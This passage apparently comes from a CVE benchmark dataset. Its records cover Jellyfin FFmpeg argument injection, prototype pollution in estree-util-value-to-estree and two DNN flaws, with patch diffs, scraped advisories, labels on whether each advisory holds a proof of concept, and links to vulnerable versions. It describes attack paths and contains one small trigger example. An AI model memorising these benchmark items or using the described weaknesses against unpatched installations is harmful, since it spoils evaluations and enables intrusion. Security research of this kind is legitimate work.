[RegularExpression(EncodingHelper.ContainerValidationRegex)] string container,\n         [FromQuery] bool? @static,\n         [FromQuery] string? @params,\n         [FromQuery] string? tag,\n         [FromQuery] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -578,7 +578,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -599,8 +599,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n```\n\nFilename: MediaBrowser.Controller/MediaEncoding/EncodingHelper.cs:\n```\n@@ -35,7 +35,13 @@\npublic partial class EncodingHelper\n         /// periods, underscores, commas, and vertical bars, with a length between 0 and 40 characters.\n         /// This should matches all common valid codecs.\n         /// </summary>\n-        public const string ValidationRegex = @\"^[a-zA-Z0-9\\-\\._,|]{0,40}$\";\n+        public const string ContainerValidationRegex = @\"^[a-zA-Z0-9\\-\\._,|]{0,40}$\";\n+\n+        /// <summary>\n+        /// The level validation regex.\n+        /// This regular expression matches strings representing a double.\n+        /// </summary>\n+        public const string LevelValidationRegex = @\"-?[0-9]+(?:\\.[0-9]+)?\";\n \n         private const string _defaultMjpegEncoder = \"mjpeg\";\n\n@@ -75,7 +81,7 @@\npublic partial class EncodingHelper\n         private readonly Version _minFFmpegVaapiDeviceVendorId = new Version(7, 0, 1);\n         private readonly Version _minFFmpegQsvVppScaleModeOption = new Version(6, 0);\n \n-        private static readonly Regex _validationRegex = new(ValidationRegex, RegexOptions.Compiled);\n+        private static readonly Regex _containerValidationRegex = new(ContainerValidationRegex, RegexOptions.Compiled);\n \n         private static readonly string[] _videoProfilesH264 =\n         [\n\n@@ -450,7 +456,7 @@\npublic string GetVideoEncoder(EncodingJobInfo state, EncodingOptions encodingOpt\n                     return GetMjpegEncoder(state, encodingOptions);\n                 }\n \n-                if (_validationRegex.IsMatch(codec))\n+                if (_containerValidationRegex.IsMatch(codec))\n                 {\n                     return codec.ToLowerInvariant();\n                 }\n\n@@ -491,7 +497,7 @@\npublic string GetRefererParam(EncodingJobInfo state)\n \n         public static string GetInputFormat(string container)\n         {\n-            if (string.IsNullOrEmpty(container) || !_validationRegex.IsMatch(container))\n+            if (string.IsNullOrEmpty(container) || !_containerValidationRegex.IsMatch(container))\n             {\n                 return null;\n             }\n\n@@ -709,7 +715,7 @@\npublic string GetAudioEncoder(EncodingJobInfo state)\n         {\n             var codec = state.OutputAudioCodec;\n \n-            if (!_validationRegex.IsMatch(codec))\n+            if (!_containerValidationRegex.IsMatch(codec))\n             {\n                 codec = \"aac\";\n             }\n```",
                "url": "https://github.com/jellyfin/jellyfin/commit/79f3ce53257c5291887cd52d8ac735b5252c9a97"
            }
        ],
        "published_date": "2025-04-15T20:36:24.078Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\njellyfin\n/\njellyfin\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 3.5k\nStar 39.6k\nCode\nIssues\n390\nPull requests\n135\nDiscussions\nActions\nProjects\n2\nSecurity\n8\nInsights\nAdditional navigation options\nFFmpeg Argument Injection\nHigh joshuaboniface published GHSA-2c3c-r7gp-q32m on Apr 13Apr 13, 2025\nPackage\nNo package listed\nAffected versions\n<=10.10.6\nPatched versions\n10.10.7\nDescription\nPrevious versions of Jellyfin were vulnerable to argument injection in FFmpeg. This can be leveraged to possibly achieve remote code execution by anyone with credentials to a low-privileged user. This vulnerability was previously reported in GHSA-866x-wj5j-2vf4 and patched in 10.8.13, but that patch can be bypassed. The original fix sanitizes some parameters to make injection impossible, but certain unsanitized parameters can still be used for argument injection. The same unauthenticated endpoints are vulnerable: /Videos/<itemId>/stream and /Videos/<itemId>/stream.<container>, likely alongside similar endpoints in AudioController. As reported by @mawalu and @FredericLinn in the previous advisory, this argument injection can be exploited to achieve arbitrary file write, leading to possible remote code execution through the plugin system. To restate from their report, this is a vulnerability in unauthenticated endpoints, however a valid itemId is required for exploitation which isn't directly accessible for unauthenticated attackers. Any authenticated attacker could easily retrieve a valid itemId, though, which is all the information needed to exploit this vulnerability.\nMitigation\nAdditional checks have been added to validate FFmpeg parameters more thoroughly.\nSeverity\nHigh\nCVE ID\nCVE-2025-31499\nWeaknesses\nNo CWEs\nCredits\nfreethestack\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory outlines the nature of the vulnerability and mentions the affected endpoints, but it does not present a detailed proof of concept or exact steps to reproduce the issue.",
                "url": "https://github.com/jellyfin/jellyfin/security/advisories/GHSA-2c3c-r7gp-q32m"
            }
        ],
        "sw_version": "v10.10.6",
        "sw_version_wget": "https://github.com/jellyfin/jellyfin/archive/refs/tags/v10.10.6.zip"
    },
    "CVE-2025-32014": {
        "cwe": [
            {
                "id": "CWE-1321",
                "value": "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
            }
        ],
        "description": "estree-util-value-to-estree converts a JavaScript value to an ESTree expression. When generating an ESTree from a value with a property named __proto__, valueToEstree would generate an object that specifies a prototype instead. This vulnerability is fixed in 3.3.3.",
        "languages": [
            "JavaScript",
            "TypeScript"
        ],
        "patch_commits": [
            {
                "content": "Fix __proto__ property emit\n\nThe `__proto__` property is a special use case. It can be defined as a\ncomputed property in an object expression, or via `defineProperty`. If\nit\u2019s assigned via a non-computed property in an object expression or via\na regular property assignment, even computed, this sets the prototype of\nthe object instead. This makes the generated code potentially vulnerable\nto prototype pollution.\n\nFilename: fixtures/object-proto-property-recursive/input.js:\n```\n@@ -0,0 +1,27 @@\n+// Used as input\n+// { preserveReferences: true }\n+export default ((\n+  $1 = {\n+    name: '$1'\n+  },\n+  $0 = {\n+    ['__proto__']: $1,\n+    name: '$0'\n+  }\n+) => (\n+  Object.defineProperties($1, {\n+    ['__proto__']: {\n+      value: $0,\n+      configurable: true,\n+      enumerable: true,\n+      writable: true\n+    }\n+  }),\n+  $0\n+))()\n+\n+// -------------------------------------------------------------------------------------------------\n+\n+// Default output\n+// { preserveReferences: false }\n+// Recursive references are not supported without preserveReferences\n```\n\nFilename: fixtures/object-proto-property/input.js:\n```\n@@ -0,0 +1,13 @@\n+// Used as input\n+// { preserveReferences: true }\n+export default {\n+  ['__proto__']: {}\n+}\n+\n+// -------------------------------------------------------------------------------------------------\n+\n+// Default output\n+// { preserveReferences: false }\n+const withoutPreserveReferences = {\n+  ['__proto__']: {}\n+}\n```\n\nFilename: src/estree-util-value-to-estree.ts:\n```\n@@ -326,15 +326,15 @@\nfunction symbolToEstree(symbol: symbol): Expression {\n  *   The ESTree properry node.\n  */\n function property(key: string | symbol, value: Expression): Property {\n-  const computed = typeof key !== 'string'\n+  const isString = typeof key === 'string'\n \n   return {\n     type: 'Property',\n     method: false,\n     shorthand: false,\n-    computed,\n+    computed: key === '__proto__' || !isString,\n     kind: 'init',\n-    key: computed ? symbolToEstree(key) : literal(key),\n+    key: isString ? literal(key) : symbolToEstree(key),\n     value\n   }\n }\n\n@@ -794,7 +794,15 @@\nexport function valueToEstree(value: unknown, options: Options = {}): Expression\n \n     const properties: Property[] = []\n     if (Object.getPrototypeOf(val) == null) {\n-      properties.push(property('__proto__', literal(null)))\n+      properties.push({\n+        type: 'Property',\n+        method: false,\n+        shorthand: false,\n+        computed: false,\n+        kind: 'init',\n+        key: identifier('__proto__'),\n+        value: literal(null)\n+      })\n     }\n \n     const object = val as Record<string | symbol, unknown>\n\n@@ -826,17 +834,31 @@\nexport function valueToEstree(value: unknown, options: Options = {}): Expression\n         childContext &&\n         namedContexts.indexOf(childContext) >= namedContexts.indexOf(context)\n       ) {\n-        childContext.assignment = {\n-          type: 'AssignmentExpression',\n-          operator: '=',\n-          left: {\n-            type: 'MemberExpression',\n-            computed: true,\n-            optional: false,\n-            object: identifier(context.name!),\n-            property: generate(key)\n-          },\n-          right: childContext.assignment || generate(child)\n+        if (key === '__proto__') {\n+          propertyDescriptors.push(\n+            property(key, {\n+              type: 'ObjectExpression',\n+              properties: [\n+                property('value', generate(child)),\n+                property('configurable', literal(true)),\n+                property('enumerable', literal(true)),\n+                property('writable', literal(true))\n+              ]\n+            })\n+          )\n+        } else {\n+          childContext.assignment = {\n+            type: 'AssignmentExpression',\n+            operator: '=',\n+            left: {\n+              type: 'MemberExpression',\n+              computed: true,\n+              optional: false,\n+              object: identifier(context.name!),\n+              property: generate(key)\n+            },\n+            right: childContext.assignment || generate(child)\n+          }\n         }\n       } else {\n         properties.push(property(key, generate(child)))\n```",
                "url": "https://github.com/remcohaszing/estree-util-value-to-estree/commit/d0c394fbc64bc55937ffe4e162b81f15ba506e55"
            }
        ],
        "published_date": "2025-04-07T14:56:40.413Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nremcohaszing\n/\nestree-util-value-to-estree\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 2\nStar 25\nCode\nIssues\nPull requests\nActions\nSecurity\n1\nInsights\nAdditional navigation options\nPrototype pollution in generated ESTree\nModerate remcohaszing published GHSA-f7f6-9jq7-3rqj on Apr 6Apr 6, 2025\nPackage\nnpm estree-util-value-to-estree\n(\nnpm\n)\nAffected versions\n<3.3.3\nPatched versions\n3.3.3\nDescription\nImpact\nWhen generating an ESTree from a value with a property named __proto__, valueToEstree would generate an object that specifies a prototype instead.\nExample:\nimport { generate } from 'astring'\nimport { valueToEstree } from 'estree-util-value-to-estree'\n\nconst estree = valueToEstree({\n  ['__proto__']: {}\n})\nconst code = generate(estree)\nconsole.log(code)\nOutput:\n{\n  \"__proto__\": {}\n}\nPatches\nThis was fixed in version 3.3.3.\nWorkarounds\nIf you control the input, don\u2019t specify a property named __proto__. If you don\u2019t control the output, strip any properties named __proto__ before passing it to valueToEstree.\nSeverity\nModerate\nCVE ID\nCVE-2025-32014\nWeaknesses\nCWE-1321\nCredits\nremcohaszing\nFinder\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The provided advisory includes a detail that mentions an example code which demonstrates the vulnerability.",
                "url": "https://github.com/remcohaszing/estree-util-value-to-estree/security/advisories/GHSA-f7f6-9jq7-3rqj"
            }
        ],
        "sw_version": "v3.3.2",
        "sw_version_wget": "https://github.com/remcohaszing/estree-util-value-to-estree/archive/refs/tags/v3.3.2.zip"
    },
    "CVE-2025-32035": {
        "cwe": [
            {
                "id": "CWE-351",
                "value": "CWE-351: Insufficient Type Distinction"
            }
        ],
        "description": "DNN (formerly DotNetNuke) is an open-source web content management platform (CMS) in the Microsoft ecosystem. Prior to 9.13.2, when uploading files (e.g. when uploading assets), the file extension is checked to see if it's an allowed file type but the actual contents of the file aren't checked. This means that it's possible to e.g. upload an executable file renamed to be a .jpg. This file could then be executed by another security vulnerability. This vulnerability is fixed in 9.13.2.",
        "languages": [
            "C#"
        ],
        "patch_commits": [
            {
                "content": "Merge pull request from GHSA-8q89-mqw7-9pp7\n\nAdditional File Verification\n\nFilename: DNN Platform/Library/Services/FileSystem/FileManager.cs:\n```\n@@ -211,7 +211,7 @@\npublic virtual IFileInfo AddFile(IFolderInfo folder, string fileName, Stream fil\n                         usingSeekableStream = true;\r\n                     }\r\n \r\n-                    this.CheckFileWritingRestrictions(folder, fileName, fileContent, oldFile, createdByUserID);\r\n+                    this.CheckFileWritingRestrictions(folder, fileName, fileContent, oldFile, createdByUserID, ignoreWhiteList);\r\n \r\n                     // Retrieve Metadata\r\n                     this.SetInitialFileMetadata(ref fileContent, file, folderProvider);\n\n@@ -1823,7 +1823,7 @@\nprivate void SetImageProperties(IFileInfo file, Stream fileContent)\n             }\r\n         }\r\n \r\n-        private void CheckFileWritingRestrictions(IFolderInfo folder, string fileName, Stream fileContent, IFileInfo oldFile, int createdByUserId)\r\n+        private void CheckFileWritingRestrictions(IFolderInfo folder, string fileName, Stream fileContent, IFileInfo oldFile, int createdByUserId, bool ignoreWhiteList)\r\n         {\r\n             if (!PortalController.Instance.HasSpaceAvailable(folder.PortalID, fileContent.Length))\r\n             {\n\n@@ -1848,6 +1848,14 @@\nprivate void CheckFileWritingRestrictions(IFolderInfo folder, string fileName, S\n                 var errorMessage = Localization.GetExceptionMessage(\"AddFileInvalidContent\", defaultMessage);\r\n                 throw new InvalidFileContentException(string.Format(errorMessage, fileName));\r\n             }\r\n+\r\n+            var checkWhiteList = !(UserController.Instance.GetCurrentUserInfo().IsSuperUser && ignoreWhiteList);\r\n+            if (checkWhiteList && !this.WhiteList.IsAllowedExtension(\".exe\") && !FileSecurityController.Instance.ValidateNotExectuable(fileContent))\r\n+            {\r\n+                var defaultMessage = \"The content of '{0}' is not valid. The file has not been added.\";\r\n+                var errorMessage = Localization.GetExceptionMessage(\"AddFileInvalidContent\", defaultMessage);\r\n+                throw new InvalidFileContentException(string.Format(errorMessage, fileName));\r\n+            }\r\n         }\r\n \r\n         private void ManageFileAdding(int createdByUserID, Workflow folderWorkflow, bool fileExists, FileInfo file)\n```\n\nFilename: DNN Platform/Library/Services/FileSystem/Internal/FileSecurityController.cs:\n```\n@@ -41,6 +41,19 @@\npublic bool Validate(string fileName, Stream fileContent)\n             }\n         }\r\n \r\n+        /// <inheritdoc/>\r\n+        public bool ValidateNotExectuable(Stream fileContent)\n+        {\n+            Requires.NotNull(\"fileContent\", fileContent);\r\n+\r\n+            var firstBytes = new byte[2];\r\n+            int bytesRead = fileContent.Read(firstBytes, 0, 2);\r\n+            fileContent.Position = 0;\r\n+\r\n+            // Windows exectuable files start with 0x4D 0x5A\r\n+            return bytesRead < 2 || firstBytes[0] != 0x4D || firstBytes[1] != 0x5A;\n+        }\r\n+\r\n         /// <inheritdoc/>\r\n         protected override Func<IFileSecurityController> GetFactory()\n         {\n```\n\nFilename: DNN Platform/Library/Services/FileSystem/Internal/IFileSecurityController.cs:\n```\n@@ -13,5 +13,12 @@\npublic interface IFileSecurityController\n         /// <param name=\"fileContent\">The File Content.</param>\r\n         /// <returns><see langword=\"true\"/> if the file has valid content, otherwise <see langword=\"false\"/>.</returns>\r\n         bool Validate(string fileName, Stream fileContent);\r\n+\r\n+        /// <summary>\r\n+        /// Checks the file content isn't an exectuable file.\r\n+        /// </summary>\r\n+        /// <param name=\"fileContent\">The File Content.</param>\r\n+        /// <returns>Whether the file is an exectuable file.</returns>\r\n+        bool ValidateNotExectuable(Stream fileContent);\r\n     }\r\n }\n```\n\nFilename: DNN Platform/Tests/DotNetNuke.Tests.Core/Providers/Folder/FileManagerTests.cs:\n```\n@@ -200,6 +200,8 @@\npublic void AddFile_Checks_Space_For_Stream_Length()\n \r\n             var fileContent = new MemoryStream(Encoding.ASCII.GetBytes(\"some data here\"));\r\n \r\n+            this.hostController.Setup(c => c.GetString(\"FileExtensions\")).Returns(\"\");\r\n+\r\n             this.portalController.Setup(pc => pc.HasSpaceAvailable(It.IsAny<int>(), It.IsAny<long>())).Returns(true);\r\n \r\n             this.globals.Setup(g => g.GetSubFolderPath(Constants.FOLDER_ValidFilePath, Constants.CONTENT_ValidPortalId)).Returns(Constants.FOLDER_ValidFolderRelativePath);\n\n@@ -267,6 +269,7 @@\npublic void AddFile_No_Error_When_File_Content_Is_Valid()\n                 this.portalController.Setup(pc => pc.HasSpaceAvailable(Constants.CONTENT_ValidPortalId, fileContent.Length)).Returns(true);\r\n                 this.mockFileManager.Setup(mfm => mfm.IsAllowedExtension(Constants.FOLDER_ValidSvgFileName)).Returns(true);\r\n                 this.mockFileManager.Setup(mfm => mfm.IsImageFile(It.IsAny<IFileInfo>())).Returns(false);\r\n+                this.hostController.Setup(c => c.GetString(\"FileExtensions\")).Returns(\"\");\r\n \r\n                 this.mockFileManager.Object.AddFile(this.folderInfo.Object, Constants.FOLDER_ValidSvgFileName, fileContent, false, false, Constants.CONTENTTYPE_ValidContentType);\r\n             }\n```",
                "url": "https://github.com/dnnsoftware/Dnn.Platform/commit/a5c13c3836cfbde374dc19dac032cd51af41050a"
            }
        ],
        "published_date": "2025-04-08T18:00:41.460Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ndnnsoftware\n/\nDnn.Platform\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 757\nStar 1.1k\nCode\nIssues\n253\nPull requests\n11\nDiscussions\nActions\nProjects\n1\nSecurity\n6\nInsights\nAdditional navigation options\nFile contents aren't checked when uploading files\nLow valadas published GHSA-8q89-mqw7-9pp7 on Apr 7Apr 8, 2025\nPackage\nDnn.Platform\n(C#)\nAffected versions\n<9.13.2\nPatched versions\n9.13.2\nDescription\nSummary\nWhen uploading files (e.g. when uploading assets), the file extension is checked to see if it's an allowed file type but the actual contents of the file aren't checked.\nDetails\nWhen uploading files (e.g. when uploading assets), the file extension is checked to see if it's an allowed file type but the actual contents of the file aren't checked. This means that it's possible to e.g. upload an executable file renamed to be a .jpg. This file could then be executed by another security vulnerability.\nThis is a relatively minor issue unless combined with other vulnerabilities.\nSeverity\nLow\n2.6\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:L/A:N\nCVE ID\nCVE-2025-32035\nWeaknesses\nNo CWEs\nCredits\nmwigley-trilogy\nRemediation developer\nbdukes\nRemediation reviewer\nvaladas\nRemediation reviewer\nmitchelsellers\nRemediation reviewer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory explains the vulnerability but does not include explicit reproducibility steps or proof of concept.",
                "url": "https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-8q89-mqw7-9pp7"
            }
        ],
        "sw_version": "v9.13.2-rc1",
        "sw_version_wget": "https://github.com/dnnsoftware/Dnn.Platform/archive/refs/tags/v9.13.2-rc1.zip"
    },
    "CVE-2025-32371": {
        "cwe": [
            {
                "id": "CWE-451",
                "value": "CWE-451: User Interface (UI) Misrepresentation of Critical Information"
            }
        ],
        "description": "DNN (formerly DotNetNuke) is an open-source web content management platform (CMS) in the Microsoft ecosystem. A url could be crafted to the DNN ImageHandler to render text from a querystring parameter. This text would display in the resulting image and a user that trusts the domain might think that the information is legitimate. This vulnerability is fixed in 9.13.4.",
        "languages": [
            "C#"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\nDNNImageHandler - Add Option to prevent URL text from appearing as content\n\nFilename: DNN Platform/Library/Services/GeneratedImage/DnnImageHandler.cs:\n```\n@@ -17,6 +17,7 @@\nnamespace DotNetNuke.Services.GeneratedImage\n     using System.Web;\r\n \r\n     using DotNetNuke.Common;\r\n+    using DotNetNuke.Common.Utilities;\r\n     using DotNetNuke.Entities.Portals;\r\n     using DotNetNuke.Services.FileSystem;\r\n     using DotNetNuke.Services.GeneratedImage.FilterTransform;\n\n@@ -177,7 +178,11 @@\npublic override ImageInfo GenerateImage(NameValueCollection parameters)\n \r\n                         if (!string.IsNullOrEmpty(parameters[\"Text\"]))\r\n                         {\r\n-                            placeHolderTrans.Text = text;\r\n+                            bool.TryParse(Config.GetSetting(\"AllowDnnImagePlaceholderText\"), out bool allowDnnImagePlaceholderText);\r\n+                            if (allowDnnImagePlaceholderText)\r\n+                            {\r\n+                                placeHolderTrans.Text = text;\r\n+                            }\r\n                         }\r\n \r\n                         if (!string.IsNullOrEmpty(parameters[\"BackColor\"]))\n\n@@ -265,7 +270,6 @@\npublic override ImageInfo GenerateImage(NameValueCollection parameters)\n                         break;\r\n \r\n                     default:\r\n-\r\n                         string imageTransformClass = ConfigurationManager.AppSettings[\"DnnImageHandler.\" + mode];\r\n                         string[] imageTransformClassParts = imageTransformClass.Split(',');\r\n                         var asm = Assembly.LoadFrom(Globals.ApplicationMapPath + @\"\\bin\\\" +\n```\n\nFilename: DNN Platform/Website/DotNetNuke.Website.csproj:\n```\n@@ -1254,6 +1254,7 @@\n<Content Include=\"Providers\\DataProviders\\SqlDataProvider\\09.11.01.SqlDataProvider\" />\r\n     <Content Include=\"Providers\\DataProviders\\SqlDataProvider\\09.11.02.SqlDataProvider\" />\r\n     <Content Include=\"Providers\\DataProviders\\SqlDataProvider\\09.12.01.SqlDataProvider\" />\r\n+    <Content Include=\"Install\\Config\\09.13.04.config\" />\r\n     <Content Include=\"Providers\\DataProviders\\SqlDataProvider\\09.13.04.SqlDataProvider\" />\r\n     <None Include=\"web.Debug.config\">\r\n       <DependentUpon>web.config</DependentUpon>\n```\n\nFilename: DNN Platform/Website/Install/Config/09.13.04.config:\n```\n@@ -0,0 +1,8 @@\n+<configuration>\n+  <nodes configfile=\"web.config\">\n+    <node path=\"/configuration/appSettings\" action=\"add\">\n+      <!-- Can be set to true to allow the image handler to display text passed in the querystring. -->\n+      <add key=\"AllowDnnImagePlaceholderText\" value=\"false\" />\n+    </node>\n+  </nodes>\n+</configuration>\n\\ No newline at end of file\n```\n\nFilename: DNN Platform/Website/development.config:\n```\n@@ -37,8 +37,8 @@\n<connectionStrings>\n     <!-- Connection String for SQL Server 2008/2012 Express -->\n     <add name=\"SiteSqlServer\" connectionString=\"Data Source=.\\SQLExpress;Integrated Security=True;User Instance=True;AttachDBFilename=|DataDirectory|Database.mdf;\" providerName=\"System.Data.SqlClient\"/>\n-    <!-- Connection String for SQL Server 2008/2012\n-    <add name=\"SiteSqlServer\" connectionString=\"Server=(local);Database=DotNetNuke;uid=;pwd=;\" providerName=\"System.Data.SqlClient\" />\n+    <!-- Connection String for SQL Server 2008/2012\r\n+    <add name=\"SiteSqlServer\" connectionString=\"Server=(local);Database=DotNetNuke;uid=;pwd=;\" providerName=\"System.Data.SqlClient\" />\r\n     -->\n   </connectionStrings>\n\n@@ -55,7 +55,7 @@\n<!--optionally strip angle brackets on public login and registration screens-->\n     <add key=\"PersistentCookieTimeout\" value=\"0\"/>\n     <!--use as persistent cookie expiration. Value is in minutes, and only active if a non-zero figure-->\n-    <!-- set UsePortNumber to true to preserve the port number if you're using a port number other than 80 (the standard)\n+    <!-- set UsePortNumber to true to preserve the port number if you're using a port number other than 80 (the standard)\r\n         <add key=\"UsePortNumber\" value=\"true\" /> -->\n     <!-- Services Framework Tracing is primarily useful for developing and debugging -->\n     <add key=\"EnableServicesFrameworkTracing\" value=\"false\" />\n\n@@ -64,7 +64,9 @@\n<add key=\"loginUrl\" value=\"~/Login.aspx\" />\n     <add key=\"ValidationSettings:UnobtrusiveValidationMode\" value=\"None\" />\n     <add key=\"MobileViewSiteCookieName\" value=\"dnn_IsMobile\" />\n-    <add key=\"DisableMobileViewSiteCookieName\" value=\"dnn_NoMobile\" />\n+    <add key=\"DisableMobileViewSiteCookieName\" value=\"dnn_NoMobile\" />\r\n+    <!-- Can be set to true to allow the image handler to display text passed in the querystring. -->\r\n+    <add key=\"AllowDnnImagePlaceholderText\" value=\"false\" />\n   </appSettings>\n \n   <system.web.webPages.razor>\n\n@@ -148,19 +150,19 @@\n<authentication mode=\"Forms\">\n       <forms name=\".DOTNETNUKE\" protection=\"All\" timeout=\"60\" cookieless=\"UseCookies\"/>\n     </authentication>\n-    <!--\n-    <identity impersonate=\"true\"/>\n-    <authentication mode=\"Windows\">\n-    </authentication>\n+    <!--\r\n+    <identity impersonate=\"true\"/>\r\n+    <authentication mode=\"Windows\">\r\n+    </authentication>\r\n     -->\n     <!-- allow large file uploads -->\n     <httpRuntime targetFramework=\"4.7.2\" shutdownTimeout=\"120\" executionTimeout=\"1200\" useFullyQualifiedRedirectUrl=\"true\" maxRequestLength=\"28672\" requestLengthDiskThreshold=\"81920\" maxUrlLength=\"2048\" requestPathInvalidCharacters=\"&lt;,&gt;,*,%,:,\\,?\" enableVersionHeader=\"false\"  requestValidationMode=\"2.0\" fcnMode=\"Single\" />\n     <httpCookies httpOnlyCookies=\"true\" requireSSL=\"false\" domain=\"\"/>\n-    <!--  GLOBALIZATION\n-    This section sets the globalization settings of the application.\n-    Utf-8 is not supported on Netscape 4.x\n-    If you need netscape compatiblity leave iso-8859-1.\n-    UTF-8 is recommended for complex languages\n+    <!--  GLOBALIZATION\r\n+    This section sets the globalization settings of the application.\r\n+    Utf-8 is not supported on Netscape 4.x\r\n+    If you need netscape compatiblity leave iso-8859-1.\r\n+    UTF-8 is recommended for complex languages\r\n     -->\n     <globalization culture=\"en-US\" uiCulture=\"en\" requestEncoding=\"UTF-8\" responseEncoding=\"UTF-8\" fileEncoding=\"UTF-8\"/>\n     <!--<globalization culture=\"en-US\" uiCulture=\"en\"  fileEncoding=\"iso-8859-1\" requestEncoding=\"iso-8859-1\" responseEncoding=\"iso-8859-1\"/>-->\n\n@@ -192,33 +194,33 @@\n</controls>\n     </pages>\n     <!-- ASP.NET 2 Membership/Profile/Role and AnonymousAuthentication Providers -->\n-    <!-- anonymousIdentification configuration:\n-          enabled=\"[true|false]\"                              Feature is enabled?\n-          cookieName=\".ASPXANONYMOUS\"                         Cookie Name\n-          cookieTimeout=\"100000\"                              Cookie Timeout in minutes\n-          cookiePath=\"/\"                                      Cookie Path\n-          cookieRequireSSL=\"[true|false]\"                     Set Secure bit in Cookie\n-          cookieSlidingExpiration=\"[true|false]\"              Reissue expiring cookies?\n-          cookieProtection=\"[None|Validation|Encryption|All]\" How to protect cookies from being read/tampered\n-          domain=\"[domain]\"                                   Enables output of the \"domain\" cookie attribute set to the specified value\n+    <!-- anonymousIdentification configuration:\r\n+          enabled=\"[true|false]\"                              Feature is enabled?\r\n+          cookieName=\".ASPXANONYMOUS\"                         Cookie Name\r\n+          cookieTimeout=\"100000\"                              Cookie Timeout in minutes\r\n+          cookiePath=\"/\"                                      Cookie Path\r\n+          cookieRequireSSL=\"[true|false]\"                     Set Secure bit in Cookie\r\n+          cookieSlidingExpiration=\"[true|false]\"              Reissue expiring cookies?\r\n+          cookieProtection=\"[None|Validation|Encryption|All]\" How to protect cookies from being read/tampered\r\n+          domain=\"[domain]\"                                   Enables output of the \"domain\" cookie attribute set to the specified value\r\n         -->\n     <anonymousIdentification enabled=\"true\" cookieName=\".ASPXANONYMOUS\" cookieTimeout=\"100000\" cookiePath=\"/\" cookieRequireSSL=\"false\" cookieSlidingExpiration=\"true\" cookieProtection=\"None\" domain=\"\"/>\n     <membership defaultProvider=\"AspNetSqlMembershipProvider\" userIsOnlineTimeWindow=\"15\">\n       <providers>\n         <clear/>\n-        <!-- Configuration for AspNetSqlMembershipProvider:\n-                connectionStringName=\"string\"               Name corresponding to the entry in <connectionStrings> section where the connection string for the provider is specified\n-                maxInvalidPasswordAttempts=\"int\"            The number of failed password attempts, or failed password answer attempts that are allowed before locking out a user?s account\n-                passwordAttemptWindow=\"int\"                 The time window, in minutes, during which failed password attempts and failed password answer attempts are tracked\n-                enablePasswordRetrieval=\"[true|false]\"      Should the provider support password retrievals\n-                enablePasswordReset=\"[true|false]\"          Should the provider support password resets\n-                requiresQuestionAndAnswer=\"[true|false]\"    Should the provider require Q & A\n-                minRequiredPasswordLength=\"int\"\t\t        The minimum password length\n-                minRequiredNonalphanumericCharacters=\"int\"  The minimum number of non-alphanumeric characters\n-                applicationName=\"string\"                    Optional string to identity the application: defaults to Application Metabase path\n-                requiresUniqueEmail=\"[true|false]\"          Should the provider require a unique email to be specified\n-                passwordFormat=\"[Clear|Hashed|Encrypted]\"   Storage format for the password: Hashed (SHA1), Clear or Encrypted (Triple-DES)\n-                